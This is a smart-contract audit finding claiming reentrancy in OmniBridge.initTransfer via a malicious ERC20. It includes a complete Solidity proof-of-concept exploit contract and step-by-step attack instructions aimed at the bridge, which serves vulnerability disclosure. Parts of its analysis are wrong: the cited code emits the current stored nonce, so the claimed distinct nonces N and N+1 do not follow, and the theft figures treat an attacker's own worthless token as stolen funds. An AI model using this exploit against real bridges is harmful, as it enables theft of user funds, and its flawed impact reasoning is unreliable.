### Title
Reentrancy in `initTransfer` via Malicious ERC20 Allows Unauthorized Token Minting on NEAR — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

### Summary
`OmniBridge.initTransfer` performs an external `safeTransferFrom` call on an arbitrary, attacker-supplied ERC20 token **before** emitting the `InitTransfer` event and **without any reentrancy guard**. A malicious ERC20 can reenter `initTransfer` during `transferFrom`, causing multiple `InitTransfer` events to be emitted on-chain while only one (or zero) actual token transfers occur. The NEAR side, which relies solely on these on-chain events as proof of locked funds, will release tokens for every emitted event, enabling the attacker to receive more tokens on NEAR than were ever locked on EVM.

---

### Finding Description

`OmniBridge.initTransfer` increments `currentOriginNonce` at the top of the function, then makes an external call to the user-supplied `tokenAddress` via `SafeERC20.safeTransferFrom`, and only afterward calls `initTransferExtension` and emits `InitTransfer`. [1](#0-0) 

The critical sequence in the non-bridge-token path is:

```
1. currentOriginNonce += 1;                          // Effect (nonce N)
2. IERC20(tokenAddress).safeTransferFrom(...);        // Interaction — UNTRUSTED CALL
3. initTransferExtension(...);                        // Effect / Interaction
4. emit InitTransfer(...);                            // Effect
``` [2](#0-1) 

Step 2 calls into an arbitrary, attacker-controlled ERC20 contract. A malicious `transferFrom` can reenter `initTransfer` before step 4 executes. Because `currentOriginNonce` was already incremented to N in the outer call, the reentrant call increments it to N+1 and runs to completion, emitting `InitTransfer` for nonce N+1. When control returns to the outer call, it emits `InitTransfer` for nonce N — even if the malicious ERC20 returned `true` from `transferFrom` without actually moving any tokens.

There is no `ReentrancyGuard` / `nonReentrant` modifier anywhere in `OmniBridge` or `OmniBridgeWormhole`. [3](#0-2) 

The NEAR side's security model explicitly states it relies solely on emitted EVM events:

> *"Every field needed to reconstruct the transfer must be in the event — it is the only data the NEAR side sees."* [4](#0-3) 

---

### Impact Explanation

**Critical — Unauthorized minting / escrow mis-accounting.**

For every reentrant `initTransfer` call that completes, the NEAR bridge will observe a valid on-chain `InitTransfer` event (verified via light client or Wormhole VAA) and release the corresponding token amount on NEAR. If the attacker emits two events (nonces N and N+1) while locking only one batch of tokens (or none), the NEAR side releases 2× (or more) the locked amount. This is a direct theft of bridged funds from the NEAR-side liquidity pool or minting of unbacked bridge tokens.

---

### Likelihood Explanation

**High.** The attack requires only:
1. Deploying a malicious ERC20 contract (trivial, permissionless).
2. Calling the public `initTransfer` function with that token address (no role required).

The bridge explicitly supports arbitrary non-bridge ERC20 tokens via the `safeTransferFrom` path. No admin compromise, no key leak, and no external oracle failure is needed. [5](#0-4) 

---

### Recommendation

Apply OpenZeppelin's `ReentrancyGuard` and add the `nonReentrant` modifier to `initTransfer`, `initTransfer1155`, and `finTransfer`. This is the exact fix applied in the referenced M03 report. Alternatively, restructure `initTransfer` to perform all state mutations and event emissions **before** any external token call (full CEI compliance), though a mutex guard is simpler and more robust.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IOmniBridge {
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC20 {
    IOmniBridge public bridge;
    bool public reentered;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Standard ERC20 stubs
    function name() external pure returns (string memory) { return "Evil"; }
    function symbol() external pure returns (string memory) { return "EVIL"; }
    function decimals() external pure returns (uint8) { return 18; }
    function balanceOf(address) external pure returns (uint256) { return 1e30; }
    function allowance(address, address) external pure returns (uint256) { return 1e30; }

    // Malicious transferFrom: reenter on first call, succeed silently on second
    function transferFrom(address, address, uint256 amount) external returns (bool) {
        if (!reentered) {
            reentered = true;
            // Reenter initTransfer — gets nonce N+1, emits InitTransfer(N+1)
            bridge.initTransfer(address(this), uint128(amount), 0, 0, "attacker.near", "");
        }
        // Return true without moving tokens — outer call emits InitTransfer(N)
        return true;
    }
}

// Attack:
// 1. Deploy MaliciousERC20(bridgeAddress)
// 2. Call bridge.initTransfer(maliciousERC20, 1000, 0, 0, "attacker.near", "")
// 3. Two InitTransfer events emitted (nonce N and N+1), 0 tokens locked
// 4. NEAR side releases 1000 tokens twice = 2000 tokens stolen
``` [1](#0-0) [6](#0-5)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L1-34)
```text
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

import {AccessControlUpgradeable} from "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {ICustomMinter} from "../../common/ICustomMinter.sol";
import {IBridgeToken} from "../../common/IBridgeToken.sol";

import "./BridgeToken.sol";
import "./SelectivePausableUpgradable.sol";
import "../../common/Borsh.sol";
import "./BridgeTypes.sol";

struct MultiTokenInfo {
    address tokenAddress;
    uint256 tokenId;
}

contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    IERC1155Receiver
{
    using SafeERC20 for IERC20;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L373-437)
```text
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        uint256 extensionValue;
        if (tokenAddress == address(0)) {
            if (fee != 0) {
                revert InvalidFee();
            }
            extensionValue = msg.value - amount - nativeFee;
        } else {
            extensionValue = msg.value - nativeFee;
            if (customMinters[tokenAddress] != address(0)) {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    customMinters[tokenAddress],
                    amount
                );
                ICustomMinter(customMinters[tokenAddress]).burn(
                    tokenAddress,
                    amount
                );
            } else if (isBridgeToken[tokenAddress]) {
                BridgeToken(tokenAddress).burn(msg.sender, amount);
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
        }

        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/CLAUDE.md (L23-23)
```markdown
**EVM → NEAR (initTransfer)**: User calls `initTransfer` which burns/locks tokens on EVM and emits `InitTransfer` with all transfer details (sender, token, amount, fee, nativeFee, recipient, message). In the Wormhole variant, a Wormhole message is also sent. The NEAR side reads this event (via light client or Wormhole) to complete the transfer. Every field needed to reconstruct the transfer must be in the event — it is the only data the NEAR side sees.
```

**File:** evm/CLAUDE.md (L32-36)
```markdown
- **No replay attacks**: Every `destinationNonce` must be checked against `completedTransfers` and marked used before any token transfer. Every `originNonce` is incremented atomically. A nonce must never be reusable
- **Event completeness**: `InitTransfer` and `FinTransfer` events must contain every field needed to reconstruct the transfer. The NEAR side relies solely on these events — any missing or ambiguous field means lost funds or spoofable transfers. Fields must not be collapsible (e.g. two different transfers must never produce the same event data)
- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
- **No token release without signature**: Never mint, transfer, or unlock tokens to a recipient without first verifying a valid MPC signature. No admin function, emergency path, or refactor may bypass this — it is the only authorization gate for finTransfer
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```
